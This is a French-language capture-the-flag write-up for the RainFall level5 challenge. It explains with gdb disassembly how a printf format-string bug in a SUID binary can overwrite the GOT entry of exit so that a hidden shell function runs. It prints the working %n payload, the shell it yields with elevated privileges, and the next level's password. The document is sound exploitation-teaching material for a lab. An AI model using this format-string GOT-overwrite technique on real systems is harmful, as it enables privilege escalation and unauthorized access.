# LEVEL5

Le système de fichier se présente de cette manière:

``` bash
level5@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level5 level5   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level5 level5  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level5 level5 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
-rw-r--r--+ 1 level5 level5   65 Sep 23  2015 .pass
-rw-r--r--  1 level5 level5  675 Apr  3  2012 .profile
```

Le fichier level5 est un exécutable.

Le bit SUID est activé, l'utilisateur level5 peut exécuter le programme avec les droits de level6.

Le programme attend une string qu'il print sur stdout :
``` bash
level5@RainFall:~$ ./level5
AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAA
```

En examinant le code assembleur avec gdb, on comprend que le programme fait un appel à la fonction sécurisée `fgets` puis print son buffer avec `printf`.

L'appel est effectué sous la forme `printf(buffer)` et non `printf("%s", buffer)`. Le contenu contrôlé par l'utilisateur devient donc directement la chaîne de format de printf. Il est alors possible d'utiliser les spécificateurs `%x`, `%p`, `%s` ou `%n`, ce qui constitue une vulnérabilité de type format string.

``` bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218                       # + 536 d'espace local sur la pile
   0x080484cb <+9>:	mov    eax,ds:0x8049848                # var globale de la libc (stdin)
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax         # 3eme arg de fgets (stdin)
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200       # 2eme arg de fgets (constante littérale 512)
   0x080484dc <+26>:	lea    eax,[ebp-0x208]                 # On récupère l'adresse du buffer (520)
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax             # 1er arg de fgets (buffer)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>           # fgets(buffer, 512, stdin)
   0x080484ea <+40>:	lea    eax,[ebp-0x208]                 # On récupère l'adresse du buffer (520)
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax             # arg de printf (buffer)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>          # printf(buffer)
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1             # arg de exit (1)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>            # exit(1)
End of assembler dump.
```

En examinant les fonctions du programme avec gdb on note l'existance d'une fonction `o` jamais appelée:

``` diff
(gdb) info functions
All defined functions:

[...]

+ 0x080484a4  o
0x080484c2  n
0x08048504  main

[...]
```

La fonction `o` fait un appel `system`,  avec comme argument "/bin/sh".

``` bash
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x18
   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0       # arg de system ()"/bin/sh")
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>          # system("/bin/sh)
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1             # arg exit (1)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>           # _exit(1)
End of assembler dump.

(gdb) x/s 0x80485f0
0x80485f0:	 "/bin/sh"
```

La fonction `o()` est présente dans le binaire, mais aucune instruction du programme ne la référence. Elle est donc inatteignable dans le déroulement normal de l'exécution. Pour l'exécuter malgré tout, il faut détourner le flux de contrôle vers son adresse. La vulnérabilité de format string nous permet justement d'écrire une valeur arbitraire en mémoire grâce au spécificateur `%n`. Une cible idéale est alors l'entrée `GOT` de exit, puisque `n()` appelle systématiquement `exit(1)` juste après le printf vulnérable. En remplaçant l'adresse de `exit` par celle de `o()`, l'appel à `exit` exécutera en réalité `o()`.

``` bash
0x080484a4  o                    # == 134513828
0x080483d0  exit
0x080483d0  exit@plt
```

On desassemble la fonction `exit@plt` pour voir l'adresse sur laquelle on jump pour l'exécuter.

``` bash
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838             # saute à l'adresse contenue dans la case GOT 0x8049838
   0x080483d6 <+6>:	push   $0x28                  
   0x080483db <+11>:	jmp    0x8048370              # saute vers le linker dynamique (ld.so) pour résoudre l'adresse
End of assembler dump.
```

`@plt` correspond à une série d'instruction assembleur qui permet de faire le relais avec la fonction `exit` de la libc.

A `exit+0` l'étoile `*` signifie saut indirect, on ne saute pas à l'adresse elle-même, on saute vers l'adresse contenue à l'intérieur de la case mémoire `0x8049838`.

`0x8049838` désigne l'emplacement fixe de l'entrée GOT pour `exit`.

On va modifier l'adresse sur laquelle pointe `0x8049838` pour qu'elle corresponde à l'adresse de `o` (`0x080484a4`).
Pour cela on va utiliser le spécificateur de `printf` `%n`. Le spécificateur `%n` n'affiche rien. À la place, il écrit dans l'adresse pointée par son argument le nombre de caractères déjà imprimés par printf

Pour construire notre exploit on va d'abord avoir besoin d'identifier où commence l'argument de `printf` dans notre sortie.
Pour cela on va utiliser le spécificateur `%x` qui permet d'afficher des valeurs arbitraires en hexa dans un ordre ascendant. 
 
``` bash
level5@RainFall:~$ echo $(python2 -c "print 'AAAA' + '%x-' *10") |./level5
AAAA200-b7fd1ac0-b7ff37d0-41414141-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-
```

Les quatre "A" apparaissent comme quatrième argument interprété par printf. L'adresse placée au début du payload sera donc également vue comme le quatrième argument, nous utiliserons donc le spécificateur `%4$n` pour modifier la valeur surlquelle elle pointe.

Maintenant que l'on a identifié l'adresse à laquelle écrire, l'emplacement de l'argument de `printf` et l'adresse à écrire sur la valeur pointée par cet argument on va calculer comment lui transmettre la valeur de l'adresse de `o` en décimal. `o` correspond à `0x080484a4` en hexa et à `134513828` en décimal. Cette valeur nous permet de calculer le padding voulu, d'une de largeur 134513824 (soit 134513828, la valeur décimale de l'adresse de `o`, moins les 4 octets déjà émis par l'écriture de l'adresse elle-même).

Voici donc notre exploit sous la forme d'un petit script python ainsi que son résultat:


``` bash
(echo $(python2 -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'); cat) | ./level5
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       512

id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)

cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

On peut décomposer notre commande de cette manière :
- On place en début de chaîne l'adresse de l'entrée GOT de exit (`0x8049838`) en little endian (`\x38\x98\x04\x08`). Cette adresse deviendra le premier argument manipulé par %n;
- `%134513824d` demande à printf d'afficher un entier avec une largeur minimale de 134513824 caractères. Comme l'entier effectivement lu sur la pile est très petit (512 dans notre cas), printf complète l'affichage avec des espaces. Au total, 134513824 caractères sont imprimés, ce qui permet à `%n` d'écrire exactement la valeur souhaitée;
- La valeur affichée (512 ici) dépend simplement de ce qui se trouve à cet emplacement de la pile. Elle n'a aucune importance, seule la largeur du champ nous intéresse.
- `%4$n` permet de désigner le 4ème argument affiché par printf pour modifier la valeur sur lequel il pointe en écrivant les octets jusque-là écrits en mémoire.

L'exploit pernet bien d'atteindre la fonction `o` qui ouvre un sub-shell avec des permission SUID. On va donc pouvoir afficher le fichier `.pass` du level6.

